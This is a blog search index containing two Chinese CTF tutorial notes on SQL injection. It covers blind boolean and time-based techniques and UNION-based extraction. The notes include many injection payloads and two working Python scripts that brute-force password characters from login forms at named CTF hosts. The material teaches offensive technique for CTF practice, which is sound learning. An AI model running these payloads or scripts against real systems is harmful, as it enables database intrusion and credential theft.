<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[WEB-CTF中的sql盲注]]></title>
      <url>/2017/09/24/WEB-CTF%E4%B8%AD%E7%9A%84sql%E7%9B%B2%E6%B3%A8/</url>
      <content type="html"><![CDATA[<p>—从零开始的笔记—<br>—requests和脚本—<br><a id="more"></a></p>
<hr>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此篇包括sql盲注，以及调用requests库的基本python脚本编写</p>
<h2 id="sql盲注的原理"><a href="#sql盲注的原理" class="headerlink" title="sql盲注的原理"></a>sql盲注的原理</h2><p>上篇也大致提了一下sql盲注，以及分为<strong>布尔型盲注</strong>,<strong>时间型盲注</strong>。<br>实际上sql盲注也很简单，其实就是不直接显示搜索到的结果，而从其他方式来推断得出结果的sql注入。<br>举起个小栗子：</p>
<ul>
<li><strong>sql回显注入</strong> ：<br>  我问你叫什么名字，你回答你叫奥特曼。</li>
<li><strong>sql布尔型盲注</strong> ：<br>  我问你叫什么名字，你只会说是和不是(ture false)。<br>  于是就，我问你叫不叫李狗蛋呀，不是。叫不叫王大花呀，不是。一直猜到是为止。<br>  但是猜也讲究技巧，一个字一个字的猜的效率比一起猜三个字效率不知道高几倍。</li>
<li><strong>sql时间型盲注</strong> ：<br>  我问你叫什么名字，无论对错，你只会 啊 的叫一声。<br>  于是就，是 = 让你立马啊，不是 = 让你过一会再啊，以此区分，就便成布尔型一样了。</li>
</ul>
<p>再类比成数据库查询，原理就是如此了。</p>
<h2 id="数据库盲注所用的函数"><a href="#数据库盲注所用的函数" class="headerlink" title="数据库盲注所用的函数"></a>数据库盲注所用的函数</h2><ul>
<li><a href="http://outofmemory.cn/code-snippet/1149/MySQL-if-case-statement-usage-summary" target="_blank" rel="external">if 和 case</a> 用于时间型盲注</li>
<li><a href="http://www.jb51.net/article/27458.htm" target="_blank" rel="external">substring()</a> 用于截断字符串</li>
<li><a href="http://www.bkjia.com/Mysql/625204.html" target="_blank" rel="external">ascii（）</a> 使字符变成ascii码（可以ascii码比较，也可直接字符比较）</li>
<li><a href="http://blog.csdn.net/keda8997110/article/details/8490895" target="_blank" rel="external">limit offset 与 limit</a> 用于查询到多条记录时选取第几条，再猜取内容，不然只会猜取第一条</li>
</ul>
<h2 id="sql盲注的步骤"><a href="#sql盲注的步骤" class="headerlink" title="sql盲注的步骤"></a>sql盲注的步骤</h2><h3 id="1-判断是否有盲注点"><a href="#1-判断是否有盲注点" class="headerlink" title="1.判断是否有盲注点"></a>1.判断是否有盲注点</h3><p><strong>布尔型盲注</strong>：布尔型盲注的注入点的表现并不绝对统一，只要当sql语句执行成功和失败的返回的页面存在某种固定差异，即存在布尔型盲注点。<br>所以可以尝试但不限于以下的语句</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>= 1<span class="string">' and '</span>1<span class="string">' = '</span>1    (前后闭合’‘，此处应该返回<span class="literal">true</span>的页面，即与<span class="variable">$name</span>=1一样)</div><div class="line"></div><div class="line"><span class="variable">$name</span>= 1<span class="string">' and '</span>1<span class="string">' = '</span>2    (前后闭合’‘, 此处应该返回<span class="literal">false</span>的信息，即与<span class="variable">$name</span>=1不同)</div><div class="line"></div><div class="line"><span class="variable">$name</span>= 1<span class="string">' or '</span>1<span class="string">' = '</span>1    (前后闭合’‘，此处应该返回<span class="literal">true</span>的页面，即与<span class="variable">$name</span>=1一样)</div><div class="line"></div><div class="line"><span class="variable">$name</span>= 1<span class="string">' or '</span>1<span class="string">' = '</span>2    (前后闭合’‘, 此处应该返回<span class="literal">false</span>的信息，即与<span class="variable">$name</span>=1不同)</div><div class="line"></div><div class="line">全句：select 列 from 表 <span class="built_in">where</span> name = <span class="string">'1'</span> and <span class="string">'1'</span>=<span class="string">'1'</span></div></pre></td></tr></table></figure>
<p><strong>时间型盲注</strong>:基于布尔型的语句上，利用if或case加以区分使返回结果有区别<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>= <span class="string">' or if('</span>1<span class="string">' = '</span>1<span class="string">',sleep(5),1) --+   (延迟返回为true)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">$name= '</span> or <span class="keyword">if</span>（<span class="string">'1'</span> = <span class="string">'2'</span>,sleep(5),1) --+  (不延迟返回为<span class="literal">false</span>，因为正确的概率低，节省时间)</div><div class="line"></div><div class="line">全句：select 列 from 表 <span class="built_in">where</span> name = <span class="string">''</span> or <span class="keyword">if</span>(<span class="string">'1'</span> = <span class="string">'1'</span>,sleep(5),1) --+</div></pre></td></tr></table></figure></p>
<p>此处跟布尔型<strong>and</strong>和<strong>or</strong>的使用故意有所区分。<br>实际情况中当你构造不出一个数据库中有的name时，如果继续使用<code>$name= &#39; and if（&#39;1&#39; = &#39;1&#39;,sleep(5),1) --+</code></p>
<p><code>$name=&#39;&#39;</code> 语句执行已经为false，根据<strong>and的就近原则</strong>：当前有false时，不执行之后的句子<br>结果将永远不延迟。</p>
<p>于是就可以用<code>&#39; or if（&#39;1&#39; = &#39;1&#39;,sleep(5),1) --+</code></p>
<hr>
<p>接下来<br>一般跳过<strong>判断select语句有几列</strong>，<strong>判断显示的信息在第几列</strong>环节，<br>因为盲注一般不用union select查询，并且没有显示信息。</p>
<h3 id="2-利用函数来搜集信息"><a href="#2-利用函数来搜集信息" class="headerlink" title="2.利用函数来搜集信息"></a>2.利用函数来搜集信息</h3><p>用户：user()<br>当前数据库：database()<br>数据库版本：version()<br>@@hostname （用户）<br>@@datadir   (数据库在文件的位置)<br>@@version  （版本)<br>@@version_compile_OS  (操作系统版本)</p>
<p><strong>布尔型:</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=<span class="string">' or select substring(user(),1,1) ='</span>r<span class="string">' --+  #截取第一位开始的一个</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全局：select 2列 from 表 where name = '</span><span class="string">' or select substring(user(),1,1) ='</span>r<span class="string">' --+'</span></div></pre></td></tr></table></figure></p>
<p>盲注查询的基本套路：截取，是否相等，相等=ture页面，不相等=false页面<br>替换r，直到ture页面<br>再substring( 巴拉巴拉 , 2 , 1 ),如此反复</p>
<p><strong>时间型:</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=<span class="string">' or  if( (select substring( user(),1,1 )='</span>r<span class="string">'),sleep(0.5),1) --+   #截取第一位开始的一个 </span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全局：select 2列 from 表 where name = '</span><span class="string">' or  if( (select substring( user(),1,1 )='</span>r<span class="string">'),sleep(0.5),1) --+'</span></div></pre></td></tr></table></figure>
<p><strong>此处说明sleep（0.5）</strong>：说是睡0.5秒实际上是 表中除了name=’’以外的记录数×0.5秒</p>
<p>此句中的sleep()语句会跟 or还是and 以及 select主句中查询的记录数 有关。<br>具体情况自己可以在mysql中试验。</p>
<p>实际操作中写的数值大就好，因为我们会根据timeout时间超时来判断，超时–&gt;正确；不超时–&gt;错误。</p>
<h3 id="3-猜解库，表，列"><a href="#3-猜解库，表，列" class="headerlink" title="3.猜解库，表，列"></a>3.猜解库，表，列</h3><p><strong>布尔型</strong>：用字典文件替换db,table,column,如果不存在，返回false界面；存在，返回true界面。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and column is not null --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全句：select 2列 from 表 where name = '</span><span class="string">' and column is not null -- '</span></div><div class="line"></div><div class="line">2.猜解当前表名------已猜出列名</div><div class="line"><span class="variable">$name</span>=<span class="string">' and table.user is not null --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">3.猜解当前数据库名--已猜出列名，表名</span></div><div class="line"><span class="string">$name='</span> and db.table.user is not null --+</div><div class="line"></div><div class="line">4.猜解当前数据库的其他表</div><div class="line"><span class="variable">$name</span>=<span class="string">' and (select count(*) from table)&gt;0 --+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">5.4.猜解其他数据库的表和列 （如果三者都不知道这种查询只能同时猜三个变量）</span></div><div class="line"><span class="string">$name='</span> and (select count(*) from db.table)&gt;0 --+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</div></pre></td></tr></table></figure></p>
<p><strong>时间型</strong>：用字典文件替换db,table,column,如果不存在，立即返回；存在，超时。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (column is not null),sleep(5),1) --+  </span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全句：select 2列 from 表 where name = '</span>1<span class="string">' and if( (column is not null),sleep(0.5)&amp;1,1) -- '</span></div><div class="line"></div><div class="line">2.猜解当前表名------已猜出列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (table.column is not null),sleep(5),1) --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">3.猜解当前数据库名--已猜出列名，表名</span></div><div class="line"><span class="string">$name=1'</span> and <span class="keyword">if</span>( (db.table.column is not null),sleep(5),1) --+</div><div class="line"></div><div class="line">4.猜解当前数据库的其他表</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (select count(*) from table)&gt;0 ,sleep(5),1)--+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">5.4.猜解其他数据库的表和列 （如果三者都不知道这种查询只能同时猜三个变量）</span></div><div class="line"><span class="string">$name='</span> and <span class="keyword">if</span>( (select count(*) from db.table)&gt;0 ,sleep(5),1) --+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</div></pre></td></tr></table></figure>
<h3 id="4-从information-schema中读取列，表，库"><a href="#4-从information-schema中读取列，表，库" class="headerlink" title="4.从information_schema中读取列，表，库"></a>4.从information_schema中读取列，表，库</h3><p>如果有访问information_schema的权限，当然可以从中读取。<br>此处列出时间型的小栗子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">1.读取列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (select substring(column_name,1,1) from information_schema.columns limit 1 offset 0 )='</span>A<span class="string">' ,sleep(5),1)--+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">2.读取表名</span></div><div class="line"><span class="string">$name=1'</span> and <span class="keyword">if</span>( (select substring(table_name,1,1) from information_schema.tables  <span class="built_in">limit</span> 1 offset 0 )=<span class="string">'A'</span> ,sleep(5),1)--+  </div><div class="line"></div><div class="line">3.读取库名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (select substring(table_schema,1,1) from information_schema.tables group by table_schema limit 1 offset 0 )='</span>A<span class="string">' ,sleep(5),1)--+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">4.读取表的库名</span></div><div class="line"><span class="string">$name=1'</span> and <span class="keyword">if</span>( (select substring(table_schuma,1,1) from information_schema.tables <span class="built_in">where</span> table_name=<span class="string">'XXXX'</span>  <span class="built_in">limit</span> 1 offset 0 )=<span class="string">'A'</span> ,sleep(5),1)--+  </div><div class="line"></div><div class="line">5.读取列的库名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (select substring(table_name,1,1) from information_schema.columns where column_name='</span>XXXX<span class="string">'  limit 1 offset 0 )='</span>A<span class="string">' ,sleep(5),1)--+</span></div></pre></td></tr></table></figure></p>
<p>布尔型的就以此类推，不再写了吧。</p>
<h3 id="5-猜解FLAG"><a href="#5-猜解FLAG" class="headerlink" title="5.猜解FLAG"></a>5.猜解FLAG</h3><p>可用select：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=<span class="string">' union select  ascii(substring(flag,1,1)) from flag ='</span>102    ------&gt;ascii匹配</div><div class="line"></div><div class="line"><span class="variable">$name</span>=<span class="string">' union select  substring(flag,1,1) from flag ='</span>A<span class="string">'            ------&gt;字符匹配</span></div></pre></td></tr></table></figure></p>
<p>不好select的情况：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=<span class="string">' or column = '</span>admin  -----&gt; 内容精准</div><div class="line"></div><div class="line"><span class="variable">$name</span>=<span class="string">' or column like '</span>%a%  -----&gt;  模糊查找</div></pre></td></tr></table></figure></p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>给出个说明较好的盲注实例 <a href="http://blog.csdn.net/pygain/article/details/53086389" target="_blank" rel="external">戳这里=w=</a></p>
<h2 id="requests与脚本"><a href="#requests与脚本" class="headerlink" title="requests与脚本"></a>requests与脚本</h2><p>盲注的手动注入不现实，burpsuite也不是很方便，学习用py脚本来盲注。<br>需要requests库，<a href="docs.python-requests.org/zh_CN/latest/user/quickstart.html">使用说明</a>。<br>贴上两道题目的解题的代码，加上注释，看着学习把。(题目访问url)</p>
<h3 id="布尔型脚本"><a href="#布尔型脚本" class="headerlink" title="布尔型脚本"></a>布尔型脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url=<span class="string">"http://58.154.33.13:8002/login.php"</span></div><div class="line"></div><div class="line">payloads=<span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@!#$%^&amp;*()-=+~`[];'./"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#判断列</span></div><div class="line">sql_column=<span class="string">"admin' and column is not null"</span>  <span class="comment">#替换column  得到 password</span></div><div class="line"><span class="comment">#判断表</span></div><div class="line">sql_table=<span class="string">"admin' and (select password from table)&gt;0"</span>  <span class="comment">#替换table 得到 admin</span></div><div class="line"><span class="comment">#列出password</span></div><div class="line">sql=<span class="string">"admin'and (select substring(password,%s,1) from admin)='%s' #"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	data=&#123;<span class="string">'username'</span>:sql %(i,x),<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</div><div class="line">	response=requests.post(url,data=data)</div><div class="line">	<span class="keyword">if</span> response.content.decode(<span class="string">'utf-8'</span>).find(<span class="string">'密码错误'</span>)&gt;<span class="number">0</span>:</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line">key=<span class="string">''</span></div><div class="line">print(<span class="string">'start'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> payloads:</div><div class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</div><div class="line">			key += x</div><div class="line">			print(key)</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure>
<h3 id="时间型脚本"><a href="#时间型脚本" class="headerlink" title="时间型脚本"></a>时间型脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line">url=<span class="string">"http://ctf5.shiyanbar.com/web/5/index.php"</span></div><div class="line">payloads=<span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@!#$%^&amp;*()-=+~`[];'./"</span></div><div class="line"><span class="comment">#判断列    通过 错误 以及  返回固定页面（正确）   ------&gt; user pw</span></div><div class="line">sql_column=<span class="string">"' or  column is not null"</span></div><div class="line"><span class="comment">#判断表    通过 错误 以及  返回固定页面（正确）   ------&gt;  php</span></div><div class="line">sql_table=<span class="string">"' or select pw from table"</span></div><div class="line"><span class="comment">#判断数据</span></div><div class="line">sql_data=<span class="string">"' or if(substring((select pw from php limit 1),%d,1)=%s,sleep(5),0) #"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	data=&#123;<span class="string">'user'</span>:sql_data %(i,x),<span class="string">'pass'</span>:<span class="string">'123'</span>&#125;</div><div class="line">	starttime=time.time()</div><div class="line">	s=requests.post(url,data=data)</div><div class="line">	<span class="keyword">if</span> time.time()-starttime &gt;<span class="number">5</span> :    <span class="comment">#post下 尝试用timeout参数失败，于是改用此方法来判定超时</span></div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line">key=<span class="string">''</span></div><div class="line">print(<span class="string">'start'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">1</span>,<span class="number">50</span>):</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> payloads:</div><div class="line">		<span class="comment">#print(i,x)</span></div><div class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</div><div class="line">			key += x</div><div class="line">			print(key)</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-CTF中的SQL注入]]></title>
      <url>/2017/08/29/WEB-CTF%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<p>—从零开始的笔记—</p>
<a id="more"></a>
<p>从最最基础的开始=.= start</p>
<h2 id="SQL注入的基本原理"><a href="#SQL注入的基本原理" class="headerlink" title="SQL注入的基本原理"></a>SQL注入的基本原理</h2><p>  你提交的<strong>任何内容</strong>都会被服务器放入sql语句中执行,于是可以构筑自己的sql语句在服务器端执行。<br>  当然以上所说的是在服务器完全没有防御的情况下，通常都不会这么简单，但是原理是相同。</p>
<h2 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h2><ul>
<li>根据注入点(既我们提交内容的位置)情况的不同分为两种：<ul>
<li>字符型注入: 提交的内容<strong>会</strong>在服务端处左右会被加上’‘</li>
<li>数字型注入: 提交的内容<strong>不会</strong>在服务端处加上’‘<br>以上两种注入的区别在于：字符型注入需要用各种方法闭合单引号,屏蔽单引号等，而数字型注入不用，即数字型相对简单。</li>
</ul>
</li>
<li>根据对于注入结果服务端会显示给攻击者与否分两种：<ul>
<li>有回显的sql注入：有显示查询结果或错误信息</li>
<li>sql盲注：没有显示直接结果或错误。但仍然由办法提取信息，sql盲注较为复杂又分为<strong>布尔型盲注</strong>和<strong>时间型盲注入</strong><ul>
<li>布尔型盲注：返回状态只有两种情况，通常为有显示true和无显示false，借此来判断是否成功。</li>
<li>时间型盲注：返回状态没有任何区别，若成功人为制造延迟时间延迟，以此来判断是否成功。<br>此篇会详细介绍有回显的sql注入，sql盲注另开一篇</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="简单的了解数据库的结构"><a href="#简单的了解数据库的结构" class="headerlink" title="简单的了解数据库的结构"></a>简单的了解数据库的结构</h2><p>  数据库 &gt; 表 &gt; 列<br>  数据库中的库名，表名，列名等基本信息会存储在information_schema这个数据库中tables，columns的表内。</p>
<table>
<thead>
<tr>
<th style="text-align:center">%</th>
<th style="text-align:center">数据库</th>
<th style="text-align:center">表</th>
<th style="text-align:center">列 </th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">  英文</td>
<td style="text-align:center">schema</td>
<td style="text-align:center">table</td>
<td style="text-align:center">column</td>
</tr>
<tr>
<td style="text-align:center">  信息库中的列名</td>
<td style="text-align:center">table_schema</td>
<td style="text-align:center">table_name</td>
<td style="text-align:center">column_name</td>
</tr>
</tbody>
</table>
<h2 id="字符型SQL注入的步骤"><a href="#字符型SQL注入的步骤" class="headerlink" title="字符型SQL注入的步骤"></a>字符型SQL注入的步骤</h2><p>  首先sql注入的<strong>核心</strong>就是去探测收集服务器的信息，再<strong>推测判断服务器sql语句</strong>的构成，再加以利用得到自己想要的数据即FLAG。</p>
<p>  以下以<strong>最基础的字符型注入</strong>为例，为了方便理解，服务端的sql语句以下为例<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select 列 from 数据库.表 <span class="built_in">where</span> name=<span class="string">'$name'</span></div></pre></td></tr></table></figure></p>
<h3 id="1-判断是否有SQL注入点"><a href="#1-判断是否有SQL注入点" class="headerlink" title="1.判断是否有SQL注入点"></a>1.判断是否有SQL注入点</h3><p>判断sql注入点：服务器会对我们除了正常输入以外的测试语句有反应</p>
<ul>
<li>报错</li>
<li>可以影响到查询结果</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>= 1<span class="string">' and '</span>1<span class="string">' = '</span>1    (前后闭合’‘，此处应该返回正确的页面，即与<span class="variable">$name</span>=1一样)</div><div class="line"></div><div class="line"><span class="variable">$name</span>= 1<span class="string">' and '</span>1<span class="string">' = '</span>2    (前后闭合’‘, 此处应该返回数据库错误的信息，即与<span class="variable">$name</span>=1不同)</div><div class="line"></div><div class="line">全句：select 列 from 表 <span class="built_in">where</span> name = <span class="string">'1'</span> and <span class="string">'1'</span>=<span class="string">'1'</span></div></pre></td></tr></table></figure>
<p>在确认有注入漏洞之后，探测sql语句组成</p>
<h3 id="2-判断select语句中有几列"><a href="#2-判断select语句中有几列" class="headerlink" title="2.判断select语句中有几列"></a>2.判断select语句中有几列</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=1<span class="string">' order by 数字n --+  （--+ 为url编码后的 --(空格) 是注释符，用于屏蔽后面的‘）</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全句：select 列 from 表 where name = '</span><span class="string">' order by 数字n -- ’</span></div></pre></td></tr></table></figure>
<blockquote>
<p><a href="http://www.w3school.com.cn/sql/sql_orderby.asp" target="_blank" rel="external">order by</a> 列名  （列名可以为select语句中列的序号,name,age——-&gt;1,2）</p>
</blockquote>
<p>因此数字从大往小猜，如果超出它的列数，则报错；如果恰好等于列数，显示$name=1的结果</p>
<p>假设结果 n=2 列</p>
<h3 id="3-判断显示的信息是第几列的信息"><a href="#3-判断显示的信息是第几列的信息" class="headerlink" title="3.判断显示的信息是第几列的信息"></a>3.判断显示的信息是第几列的信息</h3><p>一般在我们可见页面中显示的信息不一定是查询全部列数，可能查询3列，显示1列。<br>通过‘直接闭合前面的select语句，使其前半句查询结果空(除非存在name=’‘的情况)<br>union select 1,2 通过显示的数字来确定显示的列的位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$name=&apos; union select 1,2 --+</div><div class="line"></div><div class="line">全句：select n列 from 表 where name = &apos;&apos; union select 1,2 -- &apos;</div></pre></td></tr></table></figure></p>
<p>假设得到 2 ，以后想要查询的信息就放在第二个列处</p>
<h3 id="4-利用函数来收集信息"><a href="#4-利用函数来收集信息" class="headerlink" title="4.利用函数来收集信息"></a>4.利用函数来收集信息</h3><p>查询sql自带的函数来确定当前用户，当前数据库等信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">用户：user()</div><div class="line">当前数据库：database()</div><div class="line">数据库版本：version()</div><div class="line">@@hostname （用户）</div><div class="line">@@datadir   (数据库在文件的位置)</div><div class="line">@@version  （版本)</div><div class="line">@@version_compile_OS  (操作系统版本)</div><div class="line"></div><div class="line"><span class="variable">$name</span>=<span class="string">' union select 1,user() --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全局：select 2列 from 表 where name = '</span><span class="string">' union select 1,user() -- '</span></div></pre></td></tr></table></figure></p>
<p>如果为root用户，就可以访问information_schema数据库</p>
<h3 id="5-通过-union-查询数据库"><a href="#5-通过-union-查询数据库" class="headerlink" title="5.通过 union 查询数据库"></a>5.通过 union 查询数据库</h3><p>  通过<strong>information_schema数据库</strong>中的tables，columns来查询目标的数据库，表，列<br>  再直接查询内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">查询数据库</div><div class="line"><span class="variable">$name</span>=<span class="string">' union select 1,table_schema from information_schema.tables --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">查询数据库中有多少个表</span></div><div class="line"><span class="string">$name='</span> union select table_schema,count(*) from information_schema.tables --+</div><div class="line"></div><div class="line">查询指定数据库中的表名</div><div class="line"><span class="variable">$name</span>=<span class="string">' union select 1,table_name from information_schema.tables where table_schema='</span>dvwa<span class="string">' --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">查询指定数据库指定表中的列名</span></div><div class="line"><span class="string">$name='</span> union select table_name,column_name from information_schema.columns <span class="built_in">where</span> table_schema=<span class="string">'dvwa'</span> and table_name=<span class="string">'users'</span>--+</div><div class="line"></div><div class="line">查询指定数据库指定表的列的内容</div><div class="line"><span class="variable">$name</span>=<span class="string">' union select user,password from dvwa.users --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">查询链接显示</span></div><div class="line"><span class="string">$name='</span> union select null,concat_ws(<span class="string">' : '</span>,user,password) from dvwa.users --(空格)</div><div class="line"><span class="variable">$name</span>=<span class="string">' union select null,concat(user,'</span> : <span class="string">',password) from dvwa.users --(空格)</span></div><div class="line"><span class="string">ps. '</span>:<span class="string">' 编码---&gt; 0x3a</span></div></pre></td></tr></table></figure></p>
